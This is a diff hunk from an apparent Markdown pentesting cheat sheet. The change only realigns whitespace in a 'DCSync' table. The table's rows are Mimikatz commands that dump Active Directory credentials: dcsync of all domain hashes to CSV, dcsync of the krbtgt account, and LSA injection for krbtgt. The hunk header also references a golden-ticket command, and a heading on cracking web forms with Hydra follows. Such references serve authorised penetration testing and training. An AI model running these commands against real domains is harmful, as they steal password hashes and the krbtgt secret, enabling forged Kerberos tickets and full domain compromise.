@@ -169,10 +169,10 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ninja.co
 
 |DCSync |
 | ------------- |
-|lsadump::dcsync /domain:pentestlab.local /all /csv|
-|Invoke-Mimikatz -Command '"lsadump::dcsync /domain:insomnia.ninja.corp /all /csv"'|
-|Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'|
-|Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|
+|lsadump::dcsync /domain:pentestlab.local /all /csv                                 |
+|Invoke-Mimikatz -Command '"lsadump::dcsync /domain:insomnia.ninja.corp /all /csv"' |
+|Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'                          |
+|Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'                     |
 
 
 ### Avance Cracking Web Forms with Hydra
